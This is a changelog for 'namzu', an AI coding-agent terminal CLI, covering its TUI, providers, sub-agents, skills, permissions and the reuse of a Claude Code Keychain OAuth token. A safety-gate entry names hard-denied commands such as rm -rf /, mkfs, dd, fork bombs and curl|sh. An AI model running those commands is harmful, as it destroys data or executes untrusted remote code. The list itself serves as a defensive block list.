  You can now type and send a message while namzu is still responding — it's held in a queue (a "⏎ N messages queued" hint shows under the composer) and sent automatically as soon as the current turn settles, like Claude Code. The composer stays editable during a turn; queued messages run one at a time in order.

- b1e18c7: **Auto-renew the Claude Code OAuth token so it no longer 401s when it expires.**

  When namzu authenticates with the Claude Code OAuth credential from the macOS Keychain, that access token is short-lived (~8h). Previously namzu read it once at startup and held it for the whole session, so a token that lapsed — typically between turns of a long-lived session — surfaced as `Provider stream error: 401 … Invalid authentication credentials` with no way to recover.

  namzu now refreshes it automatically: before each turn it re-reads the Keychain (picking up a token Claude Code itself may have rotated) and, if the token is at/near expiry, exchanges the refresh token for a fresh one against Anthropic's OAuth endpoint, persisting the result back to the Keychain so it survives future launches. The client is only rebuilt when the token actually changes. Credentials from environment variables or clawtool secrets (which have no refresh path) are never touched.

- e16e4b3: **Paste affordance + a namzu bloom mark on the splash.**

  - Pasting a large or multi-line block no longer floods the input. It's held as an attachment chip — `⎘ Pasted text #1 (+42 lines)` — above the composer, like Claude Code. Type your prompt alongside it and send; the full pasted text is folded into the message. Backspace on an empty line removes the last paste.
  - The startup splash now shows the namzu bloom mark (`❀`, in the icon's signature green) above the NAMZU wordmark.

- 8df8f74: **M2 — Provider profile management** (`ses_003-provider-profiles`)

  `namzu providers` is now a real subcommand surface backed by `~/.namzu/providers.json`. Users persist named LLM provider configurations and the CLI surfaces them safely (secrets masked by default). M3 TUI consumes these profiles to pick a model without inline credentials in every command.

  **New subcommands** under `namzu providers`:

  - `ls [--show-secrets] [--type <t>]` — list configured profiles. Each row shows name, type, model, API key (masked `***1234` unless `--show-secrets`), default flag, and key source (`file` / `env` / `none`).
  - `add <name> --type <type> [--api-key <k>] [--base-url <u>] [--model <m>] [--default]` — persist a new profile. Type-aware: `--organization` / `--project` for openai, `--host` for ollama/lmstudio, `--region` for bedrock, `--base-url` required for http.
  - `remove <name>` — drop a profile (exit 64 if unknown).
  - `default <name>` — flip the `default` flag onto one profile (mutual exclusion enforced).
  - `path` — print the absolute store path (useful for env automation).

  **Storage** (`packages/cli/src/integrations/providers/`):

  - `~/.namzu/providers.json` — versioned (v1) JSON file, mode 0600, parent dir mode 0700. Writes are atomic (temp + rename).
  - Discriminated-union `ProviderProfile` type covers the seven providers `@namzu/sdk` ships (openai, anthropic, openrouter, ollama, bedrock, http, lmstudio).
  - `resolveApiKey(profile, env)` cascade: `NAMZU_<NAME>_API_KEY` → per-type vendor default (`OPENAI_API_KEY`, `ANTHROPIC_API_KEY`, `OPENROUTER_API_KEY`) → `profile.apiKey` on disk → `null`. Lets CI / containers inject secrets without touching disk.
  - `maskSecret(s)` returns `***<last4>`; default-safe terminal output.
  - Hand-rolled validator (no Zod yet) — zero-runtime-dep config I/O.

  **Out of scope** for M2 (deferred to M3): live `providers test` (requires LLM call + TUI feedback), OAuth flows (need TUI handoff), interactive `add` prompt for `--api-key` (TTY input → M3).

  **Tests**: 31 new unit cases (schema validation, mask, store round-trip + atomic + 0600 + env cascade + invariants). Total 115/115. Live smoke against a temp HOME validated full CRUD: `add` → `ls --show-secrets` → env override → `remove` → unknown-name 64-exit.

  **Removed**: the M0 `providers` stub from `commands/stubs.ts`; replaced by the real `commands/providers.ts`.

- 03d89f0: **`/resume` — continue a past conversation (SDK-backed sessions).**

  namzu now persists each conversation to the SDK's session store (`DiskSessionStore`) under the working directory's `.namzu` — the same hierarchy `query()` writes its runs to, so a conversation's `session.json` and `runs/` live together. Every turn (your message + the reply) is appended to the active session.

  `/resume` opens a Claude-Code-style picker of this folder's recent conversations (title + relative time); ↑/↓ navigate, Enter restores the transcript and continues in that session, Esc cancels. Each `cwd` is one project (a stable id kept in `.namzu/cli.json`); conversations are sessions under a shared CLI thread. This reuses the SDK's existing persistence rather than a parallel store.

- c8d6b66: **`namzu run` — headless one-shot mode for scripts and CI.**

  `namzu run "your prompt"` runs a single prompt through the same agent the TUI uses and prints the reply to stdout (the equivalent of claude-code's `--print`). The prompt can also come from stdin (`echo "…" | namzu run`), and `--format json` emits `{"text": "…"}`. Status lines go to stderr (silenced by `--quiet`), so stdout is just the answer. It's non-interactive (tools auto-run, but the safety gate still hard-denies catastrophic commands) and uses an ephemeral session, so one-shots don't clutter `/resume`.

- 1587792: **The agent gets the SDK's structured memory (search / read / save).**

  namzu now registers the SDK's memory tools — `save_memory`, `search_memory`, `read_memory` — backed by a `DiskMemoryStore` at `~/.namzu/memory`. The agent can record and recall structured notes on demand across the session, separate from the always-injected user-curated `MEMORY.md`/`USER.md`. (This replaces the earlier ad-hoc `remember` tool; the `/remember` slash command and memory injection are unchanged.)

- 05adb7f: **Skills (M5 core) — load SKILL.md capability docs on demand.**

  namzu now discovers agentskills.io-style skills from `~/.namzu/skills/<name>/SKILL.md` (user) and `<cwd>/skills/<name>/SKILL.md` (project, which shadows user on name clash). Each SKILL.md is YAML frontmatter (`name`, `description`) + a markdown body.

  - `/skills` — list available skills, marking which are active.
  - `/skill <name>` — activate a skill for the session; its body is injected into the agent's system prompt (alongside memory) on subsequent turns, so its guidance shapes the agent's behavior.

  Missing skill dirs are fine (empty list). Verified live: a project skill that says "end every reply with BANANAS" made namzu do exactly that. `namzu skills` CLI subcommands, skill chains, and registry fetch are follow-ups.

- f768cc8: **Slash-command autocomplete in the composer.**

  Typing `/` now opens a dropdown of matching commands (name + description) below the input, the way claude-code and gemini-cli do. Navigate with ↑/↓, press Tab to complete the highlighted command (ready for arguments), or Enter to run it. The dropdown closes once you type a space (moving on to arguments) or anything that isn't a command name; ↑/↓ fall back to input history when it's closed.

- 6b74cd0: **Sub-agents do real work, and tool tracking is keyed on the SDK's tool-use id.**

  - Sub-agents now get the same tool set as the parent — builtins, memory, and clawtool's catalog (deferred, incl. web search/fetch and peer dispatch) — so a delegated research/work task can actually use tools instead of answering from memory alone.
  - The transcript's live tool tracking now matches each call by the SDK's stable `toolUseId` rather than by name/order, so parallel tool calls (even same-named) are attributed correctly.
  - Stronger anti-fabrication instruction for both the main agent and sub-agents: never claim to have run a tool, written a file, or produced a result without actually doing it; if a capability is unavailable, say so instead of inventing output.
  - `@namzu/sdk`: the `Agent` tool's `subagent_type` is now optional when only one sub-agent is registered (defaults to it), so the model can't trip a "subagent_type required" validation error on the common single-sub-agent setup.

- 6473da4: **Sub-agent delegations now show what the sub-agent did.**

  When the agent delegates via the `Agent` tool, the sub-agent's own tool steps are collected while the call runs and shown as a `├─/└─` tree beneath the delegation's result — so you can see the work the sub-agent performed (e.g. which files it read or commands it ran), collapsible with Ctrl+O like any tool output.

- d86b161: **namzu can now delegate to sub-agents.**

  The CLI wires the SDK's native delegation: the model gets the canonical `Agent({ description, prompt, subagent_type })` tool and can hand a self-contained task to a fresh `general-purpose` sub-agent that runs in its own context window with its own tools, then returns its result. Delegations show in the transcript as a normal `Agent(...)` tool call with a live spinner and result.

  To support this from a host, `@namzu/sdk` now exports `ThreadManager` and `InMemoryThreadStore` from its public runtime surface (alongside the already-public `AgentManager`, `AgentRegistry`, `ReactiveAgent`, `LocalTaskGateway`, `buildAgentTool`, and the session/summary/capacity/workspace primitives) so a consumer can stand up an `AgentManager` end to end.

- 31bc8ee: **The agent can track a plan with the SDK task system (todo-style).**

  namzu now passes a `DiskTaskStore` to the agent loop, which auto-registers the SDK's `task_create` / `task_update` / `task_list` tools. The model can lay out and track a multi-step plan for the current request (like Claude Code's todos): new tasks appear as `☐ <subject>` and completed ones as `☑ <subject>` in the transcript. Tasks are scoped to the request.

- 4d56ee4: **Tool calls now show their diff / output, collapsible with Ctrl+O.**

  When namzu edits or writes a file, the change is shown as a `- old` / `+ new` diff (write shows the content) right under the `⏺` call. When it runs a command or reads a file, the output appears under the `⎿` result. Long blocks collapse to 6 lines with a `… +N lines (ctrl+o to expand)` hint; **Ctrl+O** toggles full expansion for everything. Diff lines are colored (green additions, red removals).

- 9b57742: **M3 polish — clawtool-backed onboarding + TUI visual treatment** (`ses_005-credentials-and-tui-polish`)

  `namzu` (no args) now starts the right way: it asks **clawtool** what's available instead of demanding a manual provider profile, and the screen actually looks like a product.

  **Credentials-first onboarding (no login flow, ever).** First run:

  1. Probe `GET /v1/agents` against the local clawtool daemon (auto-spawned via M1's `ensureDaemon`).
  2. Render an inline **picker** listing every agent instance clawtool knows about — `claude`, `codex`, `gemini`, `opencode`, `aider`, `hermes`, etc. — each with a `callable` / `bridge-missing` badge.
  3. User picks a **default** (handles the direct turn) and ticks any others to keep **active** (for subagent dispatch).
  4. Selection persists to `~/.namzu/preferences.json` (mode 0600 — instance names only, **no credentials**; clawtool owns those).
  5. Subsequent turns dispatch via `POST /v1/send_message {instance, prompt}` and stream the NDJSON reply into the transcript.

  Picker keybindings: ↑/↓ navigate, `space` toggle active, `d` set default (must be `callable`), `enter` accept, `esc` cancel. `bridge-missing` rows show with a hint pointing the user at `clawtool agents claim <instance>`.

  **Why this replaces the M3 direct-API path:** clawtool already runs every credential / OAuth / bridge flow on this machine. Detecting env vars + OAuth files in TS would duplicate that and silently diverge. namzu becomes the UX layer over clawtool's authoritative registry. M2's `~/.namzu/providers.json` stays as an escape hatch for raw-API setups but is no longer the front door.

  **TUI visual treatment:**

  - Banner: `▲ namzu <version> · <provider>` on every render — clear identity moment without giant FIGlet.
  - Bordered panels (`borderStyle: 'round'`) around the transcript and composer. Composer border switches to focus color when idle + ready.
  - Message bubbles get role glyphs: `▸ you`, `◆ namzu`, `⚠ system` (not just colored labels — glyphs read faster scanning back).
  - Streaming spinner: braille frames `⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏` in front of the pending assistant bubble while `thinking`. 80ms cadence.
  - StatusBar: `cwd · provider · model │ state │ hint` with `│` dividers and a state glyph (`● idle`, `◐ thinking`, `◑ tool`, `◓ approve?`).
  - Composer prompt glyph: `›` when idle, `…` when disabled.
  - Picker: bordered overlay with `[ ]`/`[x]` toggles + `( )`/`(•)` radio + per-row status badge + dim help footer.

  **Internals** (`packages/cli/src/integrations/clawtool/`):

  - `agents.ts` — `listAgents({callableOnly?})` calls `GET /v1/agents`, returns the typed registry.
  - `dispatch.ts` — `sendMessage({instance, prompt, signal?})` POSTs `/v1/send_message`, streams NDJSON via `response.body.getReader()`, normalizes per-family frames (text deltas, Anthropic `content_block_delta`, OpenAI `choices[0].delta.content`, plain-text passthrough) into a small `{kind: 'delta'|'done'|'error'}` event union. Tool-call / tool-result frames are silently dropped here; surfacing them is ses_006.
  - `preferences.ts` — `~/.namzu/preferences.json` v1 atomic store with `default + active` invariants. Mode 0600 file / 0700 dir, `crypto.randomBytes`-suffixed temp.
  - `daemon.ts` — `ensureDaemon` now honors explicit empty-string token (no-auth daemon) in the fast path; only `undefined` triggers discovery.

  `packages/cli/src/tui/`:

  - `Picker.tsx` — new; the first-run interactive list.
  - `App.tsx` — replaced the M3 Phase-C provider hydration with `probeAgentSession()` (preferences + `/v1/agents`); renders `<Picker>` when first-run, `<Transcript>` + `<Composer>` after.
  - `agent.ts` — replaced direct `provider.chatStream()` with the clawtool dispatch path. The `Message[]` parameter is gone; the TUI just hands `send(text)` a string per turn.
  - `Transcript.tsx`, `StatusBar.tsx`, `Composer.tsx` — visual polish per the section above.

  **Tests**: 20 new unit cases (preferences round-trip + invariants; agents wire shape + Bearer omission for no-auth; dispatch NDJSON parsing across Anthropic / OpenAI / plain-text / error / HTTP-error shapes). Total **150/150** (was 130). React components remain unit-test-free; live smoke against a real clawtool daemon validated the picker → dispatch round-trip.

  **Removed**: direct `@namzu/anthropic` provider construction from the TUI agent session (still a workspace dep, kept available for the M2 escape hatch). The M3 Phase-C "TUI chat against a real provider" surface stays — the path is just different now.

- 88d3a77: **M3 — TUI** (`ses_004-tui`)

  `namzu` (no args) launches an interactive Ink + React TUI. Transcript pane on top, multi-line composer at the bottom, status bar showing cwd · provider · model · state. The TUI is **the product**.

  **Default behavior change:** running `namzu` with no subcommand in a terminal now opens the TUI (replaces the M0 hotfix placeholder). Non-TTY invocations (tests, pipes, CI, `namzu | cat`) still print a one-line marker pointing at `namzu --help` so the binary stays scriptable.

  **Chat works end-to-end.** The session reads the default provider profile from `~/.namzu/providers.json` (M2), constructs an SDK provider via `ProviderRegistry.create()`, and streams the model's response per-delta through `provider.chatStream()`. Conversation history is owned by the TUI and passed on every turn. Empty-session paths (no provider configured, type ≠ anthropic, missing API key, missing model) render an actionable system message — never a crash.

  **Slash commands** (`/help`, `/clear`, `/quit`, `/exit`, `/tools`, `/provider`, `/model`) — registered via a pure parser+registry in `slashCommands.ts` (unit-tested). `/provider` and `/model` show the actual connected profile + model.

  **Keyboard model:**

  - Enter submits, Esc clears the composer, Up/Down browses input history.
  - Ctrl+C twice exits (first press arms + warns; pattern matches claude-code / hermes).
  - `exitOnCtrlC: false` so the TUI owns Ctrl+C semantics rather than Ink killing the process.

  **Provider coverage in this commit:** anthropic only. Other types (openai, openrouter, ollama, bedrock, http, lmstudio) gracefully error with a hint to add an anthropic profile or wait for a follow-up — each is one `register<Vendor>()` + type-case away.

  **Tool dispatch + permission overlay** (Phase D of the original M3 plan) is **deferred to its own session (`ses_005`)** so this milestone closes with a reviewable surface. The user's flagged review checkpoint sits naturally here: chat works, tools are next.

  **Internals** (`packages/cli/src/tui/`):

  - `index.tsx` — `launchTui(ctx)` entry; `exitOnCtrlC: false`; lazy-imported from `cli.ts` so non-TTY paths stay free of Ink.
  - `App.tsx` — root; state-at-top (messages / history / agent-state / session); bootstraps the agent in `useEffect`; `runTurn()` builds the SDK `Message[]` from a transcript snapshot and streams deltas into a pending bubble.
  - `Composer.tsx`, `Transcript.tsx`, `StatusBar.tsx` — Ink components; Composer uses Ink's `useInput` (no extra `ink-text-input` dep).
  - `slashCommands.ts` — pure registry + `parseSlash` / `runSlash`; unit-tested.
  - `agent.ts` — `createAgentSession()` reads the default profile, calls `registerAnthropic()`, constructs the provider, exposes `send(messages, abort?) → AsyncIterable<AgentEvent>` over `provider.chatStream()`.
  - `theme.ts`, `types.ts` — color tokens + shared shapes.

  **Tests**: 14 new cases on `slashCommands` (parseSlash + every command's action). Total 130/130 (was 116). React layer is intentionally not unit-tested in M3 — Ink + JSDOM is brittle; the layer is exercised by live smoke against a real terminal + real anthropic key. `agent.ts` is exercised by the same smoke.

  **Deps added** to `@namzu/cli`: `ink@^7.0.3`, `react@^19.2.6`, `@types/react@^19.2.15`, `@namzu/anthropic` (workspace).

- b4a25fb: **Interactive tool permission + interruptible turns in the TUI.**

  Tools no longer run blind. Before a non-read-only batch (write/edit/bash/append, anything flagged destructive, or any tool not on the read-only allowlist), namzu now shows the proposed call(s) — with a content/diff preview for `write` and `edit` — and waits for **y** (approve) / **n** (reject) / **a** (approve all for this session). Read-only batches (read/glob/grep) still run silently. Rejection feeds the model a decline message so it can adapt; "approve all" stops prompting for the rest of the session.

  This is wired through a custom `resumeHandler` bridged to the TUI via an async `onPermission` callback on `send()`; when no callback is supplied the loop auto-approves (non-interactive behaviour unchanged).

  Ctrl+C is now context-aware: while a turn is running it **interrupts the turn** (aborts the agent loop) instead of arming exit; while awaiting a permission decision it rejects and aborts; only when idle does the existing double-Ctrl+C exit apply.

  Verified end-to-end against the live Anthropic API: asking namzu to write a file triggers a write-permission prompt (destructive, with a content preview); approving runs the write and the file is created.

- 102b68e: **TUI picks an LLM provider, not a clawtool peer.**

  The TUI's first-run picker now selects a primary LLM provider client (Anthropic / OpenAI / OpenRouter / Ollama / LM Studio / Bedrock) — what powers namzu's own chat. Clawtool peers (claude-code / codex / gemini-cli / opencode / aider / hermes) are a separate concern reserved for subagent dispatch and stay wired in the codebase as integration backbones, not as the picker target.

  **Credential discovery (Hermes-style):**

  For each provider in the declarative `PROVIDER_REGISTRY`, scan three sources in order:

  1. **Env vars** with per-provider priority (e.g. `ANTHROPIC_API_KEY` → `ANTHROPIC_TOKEN` → `CLAUDE_CODE_OAUTH_TOKEN`).
  2. **Clawtool's `~/.config/clawtool/secrets.toml`** `[secrets.X]` sections — any `ANTHROPIC_API_KEY`-style key inside a scope counts.
  3. **Local server probes** — Ollama at `localhost:11434/api/tags`, LM Studio at `localhost:1234/v1/models`. Short timeout (500ms), non-throwing.

  The first positive source wins; alternatives are kept so the picker can show them. Discovery never prompts for credentials — what's already on the machine is what's offered.

  **Picker UX:**

  - Bordered round overlay, one row per detected provider with a source-of-truth label (`via ANTHROPIC_API_KEY`, `via clawtool [secrets.work]`, `local · http://localhost:11434/api/tags`).
  - Cursor + numeric 1–9 quick-select. Enter accepts, Esc cancels. The currently-saved provider is marked `← current` (for re-pick).
  - Empty-state path renders an actionable hint listing where to put a credential.

  **Persistence:** `~/.namzu/preferences.json` schema v2 — `{ version: 2, provider, model?, subagents?: { active[] } }`. v1 files (the previous shape that stored a clawtool peer instance) trigger a forced re-pick rather than silent auto-migration; the two primitives are semantically different. File mode 0600, parent dir 0700, atomic temp+rename.

  **Agent runtime:** `agent.ts` goes back to `provider.chatStream()` direct over `@namzu/sdk`'s `ProviderRegistry.create()`. Provider packages (`@namzu/anthropic`, `@namzu/openai`, `@namzu/openrouter`, `@namzu/ollama`) lazy-import on first use so the TUI's cold start doesn't pay for providers the user hasn't picked.

  **Slash:** `/model` now re-opens the picker (was an alias). `/provider` still shows the current selection.

  **Tests:** 16 new (preferences v1/v2 + invariants, discoverer over env / secrets.toml / probes / multi-detect / no-detection / http-never-auto). Total 160/160 (was 144). Code surfaces kept clean of internal session-machinery references per project preference.

  **Internals reshuffled:**

  - New: `packages/cli/src/integrations/providers/{registry,secrets,discover,preferences}.ts`
  - Replaced: `packages/cli/src/tui/{Picker,agent}.tsx/ts` — agents-as-primary path removed.
  - Removed: `packages/cli/src/integrations/clawtool/preferences.{ts,test.ts}` (was the v1 store for peer instances; superseded).
  - Kept: `packages/cli/src/integrations/clawtool/{agents,dispatch}.ts` — these stay shipped as the implementation backbone for subagent dispatch (`SendMessage` fan-out) when that feature lands.

  **Deps added:** `@namzu/openai`, `@namzu/openrouter`, `@namzu/ollama` (workspace), `smol-toml` (~2 KB TOML reader for clawtool's secrets file).

- f03659c: **The TUI can now run tools — namzu actually does work, not just talk.**

  The interactive TUI previously streamed plain text via the provider's single-shot `chatStream()` primitive, so the model could answer but never call a tool. The turn now drives the SDK agent loop (`query()`) with a `ToolRegistry` of the builtin tools (`bash`, `read`, `write`, `edit`, `append`, `glob`, `grep`, `verify_outputs`). The model can read files, run shell commands, and edit code; tool results are fed back and the loop iterates until the turn settles.

  Tool activity is surfaced live in the transcript: a new `tool` line (⚙) shows each call (`bash › echo hi`) and failures are reported inline. The SDK logger is silenced while the TUI is mounted so log lines never corrupt the rendered frame.

  Tools currently run under `permissionMode: 'auto'` (auto-approved); an interactive permission prompt is a follow-up. clawtool's MCP tools are not yet bridged into the registry — the builtin set covers bash/read/edit today.

- 6355e81: **namzu tells you when an update is available — for itself and for clawtool.**

  On launch, namzu does a best-effort check for newer versions of `@namzu/cli` (npm) and clawtool (`clawtool upgrade --check`, with a fallback for older clawtool binaries) and, if either is behind, surfaces a single notice with how to upgrade — e.g. `clawtool 0.22.159 → 0.22.160 (clawtool upgrade)`. Offline / unpublished / no-clawtool is a silent no-op.

- e4f9123: **Safety gate: catastrophic shell commands are hard-denied before they run.**

  namzu now runs every tool call through the SDK's verification gate. Read-only tools auto-run; a narrow set of catastrophic patterns — `rm -rf /`, `mkfs`, `dd if=`, fork bombs, `sudo`/`su -`, `chmod 777 /`, `curl|sh` / `wget|sh`, `ssh user@host`, dynamic `eval` — are **hard-denied** and never execute; everything else still goes to the approval prompt. The deny rule applies even under `--dangerously-skip-permissions` / `--yolo`, so bypass mode can't brick the machine. (The list is narrow: `rm -rf node_modules` and the like are unaffected.)

### Patch Changes

- 229ff8b: **Auto-pick Claude Code's macOS Keychain OAuth token; OAuth-aware Anthropic provider; tighter picker UX.**

  Hotfix landing two coupled pieces — namzu now starts cleanly on a host where claude-code is already signed in, without asking the user to export anything.

  **Credentials side (`@namzu/cli`):**

  - New: macOS Keychain reader. Reads the `Claude Code-credentials` generic-password entry from the login Keychain and extracts the `claudeAiOauth.accessToken` JSON field. Pattern ported from Nous Research's hermes-agent (`agent/anthropic_adapter.py:_read_claude_code_credentials_from_keychain`). Non-throwing — every failure path (non-Darwin, security command missing, entry absent, payload malformed) returns null so the discoverer treats it as "no source" rather than crashing.
  - Discoverer extended: after env vars and clawtool `secrets.toml`, anthropic also accepts the Keychain credential. Detection source is reported as `keychain · Claude Code-credentials` in the picker, so the user can see where their token came from.
  - Token-shape detector: `isAnthropicOAuthToken(value)` identifies OAuth tokens by prefix (`cc-`, `sk-ant-oat`, `eyJ`) vs console API keys (`sk-ant-api`). Drives the apiKey-vs-authToken decision when constructing the Anthropic provider.

  **Provider side (`@namzu/anthropic`):**

  - `AnthropicConfig.apiKey` is now optional, mutually exclusive with the new `authToken` field. Exactly one must be set; the constructor throws if neither is.
  - When `authToken` is supplied, the underlying `@anthropic-ai/sdk` client is constructed with `authToken: <token>` (Bearer auth) and the `anthropic-beta: oauth-2025-04-20` header is injected so Anthropic's OAuth routes accept the request. User-supplied `defaultHeaders` merge on top.
  - API-key path unchanged — existing `apiKey` callers see no behavior change.

  **Picker UX:**

  - Width capped at 72 chars; previously stretched to the full terminal and looked uncomfortable on wide screens.
  - Empty-state copy tightened — concrete `export ANTHROPIC_API_KEY=…` lines instead of a long paragraph; explicit mention that on macOS a signed-in claude-code is auto-detected via the Keychain.
  - Source labels condensed (`env · ANTHROPIC_API_KEY`, `keychain · Claude Code-credentials`, `clawtool · [work]`, `local · localhost:11434/api/tags`).

  **Tests:** 5 new keychain unit cases (token-shape detection) plus existing discover tests updated to opt out of host-ambient sources (`skipKeychain: true`) so the suite stays hermetic on any laptop. Total 165/165 (was 160).

  **Live verification:** on this machine, `namzu` now auto-detects the Claude Code OAuth credential from the Keychain, picker shows `Anthropic (Claude)  keychain · Claude Code-credentials  ← current` after first pick, and `provider.chatStream()` constructs through the Bearer-auth path with the required beta header.

- deb6650: **The banner now shows an ASCII "namzu" wordmark instead of the mascot glyph.**

  The header's flower-face mascot is replaced by a compact three-row ASCII "namzu" wordmark that sits beside the version / provider / path block and keeps the existing alignment. On terminals too narrow for it, the banner falls back to the single `❀` bloom mark with the "Cogitave Namzu" label as before.

- a33fa55: **M0 — CLI Bootstrap** (`ses_001-cli-bootstrap`)

  Turn `packages/cli` from a single-command stub into an extensible command shell. No new user-visible feature beyond what already shipped (`doctor` behavior is unchanged); every later milestone (M1–M7) now has a place to plug in.

  - **Command framework:** Commander.js wires subcommand routing, `--help`, `--version`. Each command is a `CommandDef` (name, description, optional passThrough, handler) registered through a thin adapter, so swapping the framework later is a one-file change.
  - **Doctor preserved:** the legacy `runDoctorCommand(args)` signature and its `--json`/`--category`/etc. flags are forwarded unparsed (`passThrough: true`); the doctor JSON shape and exit codes are unchanged.
  - **Output formatters:** new `--format <text|json|yaml>` and `--quiet` global flags. Stubs print structured payloads through a `Formatter` (text/json/yaml). Doctor keeps its own `--json` for now.
  - **Config cascade:** `loadConfig()` resolves CLI flags > `NAMZU_*` env > `./namzu.config.json` > `~/.namzu/config.yaml` > defaults. Schema is intentionally minimal (`format`, `quiet`) — milestones populate it as concrete settings land.
  - **Stub commands:** `chat` (M3), `tools` (M1), `providers` (M2), `skills` (M5), `serve` (M7) — each prints its milestone marker through the active formatter and exits 0.
  - **Tests:** `runCli`, formatter factory, and config cascade are covered; pre-M0 `doctor` tests are untouched and still pass.

  Exit codes follow sysexits: `0` OK, `1` doctor checks failed, `2` no config, `64` `EX_USAGE` (Commander parse errors), `70` `EX_SOFTWARE` (internal CLI error / doctor's pre-existing unknown-option path).

  New library exports: `runCli`, `registerAll`, `registerCommand`, `createFormatter`, `loadConfig`, `DEFAULT_CONFIG`, and the `CommandDef` / `CommandContext` / `Formatter` / `NamzuCliConfig` types.

- 142b695: **M0 hotfix** (`ses_002-clawtool-bridge`) — align CLI shape with the TUI-as-default product vision.

  - **Removed:** `namzu chat` stub command. The `chat` subcommand was a misread of the product shape: namzu's primary user surface is a TUI (like claude-code, gemini-cli, opencode, and hermes-agent's TUI), and the TUI **is** the chat. Having a separate `chat` subcommand framed the CLI as "command-first" when it's actually "TUI-first with utility subcommands".
  - **Added:** default behavior for `namzu` (no args) — prints a one-line placeholder (`namzu — TUI coming in M3. For utility subcommands run namzu --help.`) and exits 0. M3 will replace this with the actual Ink + React TUI launch.
  - `namzu --help` still lists the utility surface (`doctor`, `tools`, `providers`, `skills`, `serve`).

  Reference TUIs vendored at `cogitave.com/vendor/{google-gemini/gemini-cli, sst/opencode, NousResearch/hermes-agent}` guide the M3 shape: minimalist scrolling transcript + bottom composer + dialog overlays, slash-command registry, permission-with-inline-diff for tool calls.

  No library API changes; the doctor command and all M0 plumbing (Commander shell, output formatters, config cascade, sysexits mapping) remain identical.

- 38c4b62: Harden two paths flagged by an adversarial review: `ToolRegistry.searchDeferred` no longer over-activates deferred tools — batched-query tokens match the tool name only (not descriptions) and short/generic tokens like `clawtool` are ignored, so a common word can't activate the whole catalog. The dynamic `Agent` sub-agent now unregisters its per-call `dyn-N` definition in a `finally`, so long sessions don't leak persona registrations on success, failure, or throw.
- 2b08383: **Automatic context compression on long turns.** namzu now passes the SDK's structured compaction config to the agent loop, so very long, tool-heavy turns summarize old tool results/notes (keeping recent messages verbatim) instead of growing the context unbounded. Transparent for normal turns.
- 5b1fe2f: Markdown links (`[text](url)`) in assistant replies now render with the link text in the accent color (underlined) followed by the URL dimmed, instead of raw `[text](url)` syntax.
- c12cd19: The header now shows a little **namzu mascot** — a bloom flower over a friendly `•◡•` face, in the teal/green brand palette (a nod to Claude Code's mascot, themed to the namzu.ai flower) — beside the **Cogitave Namzu** name, version, provider · model, and working directory.
- 38c4b62: Stop bridging clawtool's `Agent*` persona-file tools (`AgentNew`, `AgentList`, `AgentDetect`) into the agent. Those write Claude-Code-style definitions into `.claude/agents/` — a different, redundant mechanism that polluted Claude Code's directory and confused the model alongside namzu's own in-memory dynamic sub-agents. namzu owns sub-agent definition + dispatch natively, so these clawtool tools are excluded from the bridged catalog.
- 38c4b62: Harden namzu's anti-fabrication guardrails against relaying another agent's claims as fact. A reply from a tool that delegates to a separate agent (clawtool `agent.run`, an A2A `tasks/send`, a remote peer) is that agent's unverified narrative — it can hallucinate (e.g. claiming a Windows file write when the box is actually WSL2 Ubuntu). namzu is now instructed to treat such replies as claims, confirm them with a deterministic tool (a real shell, a file read) before reporting them as done, and never present another agent's prose as its own verified result.
- d6b5bc1: **Remove the legacy `append` file tool.** `AppendFileTool` is gone — it was already excluded from `getBuiltinTools()` (Claude Code's tool distribution has no `Append`), and appending is canonical `edit` with `insertLine: "end"`. The export is removed from the public surface; hosts that relied on it should switch to `edit`. namzu's CLI no longer needs to filter `append` out of its tool set.
- 38c4b62: Match completed tool calls strictly by `toolUseId` in the TUI. The tool-end handler fell back to "the first active tool" when no id matched, which under parallel tool calls attributed a result to the wrong call. Now an unmatched completion renders on its own line and never closes the wrong spinner.
- 5b62e04: **Tool output reads cleaner.** Bash results drop their `STDOUT:` / `STDERR:` section labels (the ✓/✗ glyph already signals success), and every collapsible tool block (output, diffs, sub-agent trees) is now framed by a dim left rule `▏`, the way Claude Code / Warp set tool output apart from the conversation.
- 88079b0: **Cleaner tool output in the transcript.**

  Tool results that come back as JSON (clawtool / MCP tools) no longer render as a raw one-line blob: a `{ output | result | content | text }` envelope is unwrapped to just its payload, and any other JSON is pretty-printed. The one-line `⎿` summary is derived the same way (the payload's first line, an error message, or a short key list) instead of a truncated JSON string — so a tool call reads at a glance.

- 38c4b62: `namzu tools ls` now hides the clawtool tools namzu excludes from the agent (the `.claude/agents` Agent\* family), so the listing reflects what the model can actually call instead of advertising bridged tools that are filtered out.
- 50e9cce: **Fix the long-session out-of-memory crash and the banner that drifted down the screen.**

  The transcript used to re-render its entire history on every frame (each spinner tick and streamed token), so a long conversation grew the render tree until Node aborted with a 4 GB heap out-of-memory. Finalized messages now render through Ink's `<Static>` — each line is printed to scrollback exactly once and never re-rendered — so memory and per-frame work stay bounded and the flicker is gone; only the in-progress reply stays live.

  The same change pins the header: because `<Static>` output is written above the live region, the banner (logo + provider + cwd) used to slide downward as messages accumulated. It is now the first static row, anchored to the top of the conversation.

- 6bd4c6b: **TUI redesign — cleaner, modern layout (gemini-cli / claude-code grade).**

  The interactive UI was visually heavy and cramped. It's been reworked to match the patterns of leading agent CLIs:

  - **Borderless, edge-to-edge transcript.** The round box around the message stream is gone; messages now use a two-column layout — a glyph gutter (`>` you, `✦` namzu, `⚙` tool, `·` system) plus the content, with wrapped lines hang-indented. No more redundant role-label line.
  - **Input field composer.** A rounded rule above and below the input (no side borders) with a `>` prompt and a dim placeholder, instead of a full box.
  - **One-line status bar.** The footer now truncates with an ellipsis on narrow terminals instead of wrapping into a mangled two lines, while keeping per-segment color.

  Pure visual changes; no behavior or API changes.

- a96b5c0: **Clean-screen takeover + a gradient NAMZU splash on launch.**

  namzu now clears the terminal (screen + scrollback) when it starts, so it opens on a fresh canvas instead of below leftover shell output — the clean "takeover" feel of claude-code / gemini-cli. It stays in the normal screen buffer, so native scrollback still works as the conversation grows.

  The startup banner is now an ASCII "NAMZU" wordmark rendered as a vertical teal→violet gradient, with a tagline, version, and connected provider beneath it. On narrow terminals (< 48 cols) it falls back to a compact `▲ namzu` mark.

- 54a3568: **Fix runaway interrupts and overflowing tool output.**

  - `Ctrl+C` while the agent is working now reliably stops it: it aborts the turn, **clears any queued messages** (so the queue can't immediately restart a new turn), and drops the abort handle so a second `Ctrl+C` arms exit. Previously, repeated presses spammed "Interrupted." lines and a queued message kept the agent running.
  - The user-interrupt no longer prints a redundant `Error: aborted` (the `Interrupted.` line covers it).
